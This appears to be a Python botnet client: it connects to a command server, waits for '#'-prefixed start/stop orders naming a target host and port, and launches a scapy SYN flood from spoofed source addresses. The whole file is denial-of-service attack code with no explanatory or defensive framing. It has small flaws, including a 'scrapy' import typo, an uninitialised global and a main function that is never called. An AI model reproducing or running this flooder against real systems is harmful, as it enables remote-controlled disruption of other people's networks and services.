import socket
import sys
import argparse
import os
from multiprocessing import Process
import random
from scrapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send

def cmdHandle(sock,args):
    global curProcess
    while True:
        data = sock.recv(1024).decode('utf-8')
        if len(data) == 0:
            print('the data is empty')
            continue
        if data[0] == '#':
            try:
                options = args.parse_args(data[1:].split())
                m_host = options.host
                m_port = options.port
                m_cmd = options.cmd
                if m_cmd.lower() == 'start':
                    if curProcess != None and curProcess.is_alive():
                        curProcess.terminate()
                        curProcess = None
                        os.system('clear')
                    print('the synFlood is start')
                    p = Process(target=synFlood,args=(m_host,m_port))
                    p.start()
                    curProcess = p
                elif m_cmd.lower()=='stop':
                    if curProcess.is_alive():
                        curProcess.terminate()
                        os.system('clear')
            except:
                print('failed to perform command')


def synFlood(m_host,m_port):
    src_host = ['192.168.1.2','129.12.12.132','192.168.1.26']
    index = random.randrange(0,stop=2)
    for port in range(1024,65535):
        ip = IP(src=src_host[index],dst=m_host)
        tcp = TCP(sport=port,dport=m_port,flags="S")
        pkt = ip / tcp
        send(pkt)

def main():
    a = argparse.ArgumentParser()
    a.add_argument('-H',dest='host',type=str)
    a.add_argument('-p',dest='port',type=int)
    a.add_argument('-c',dest='cmd',type=str)

    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('127.0.0.1',58868))
        print('to connected server was success')
        print('='*50)
        cmdHandle(s,a)
    except:
        print('the network connected failed')
        print('please restart the script')
        sys.exit()


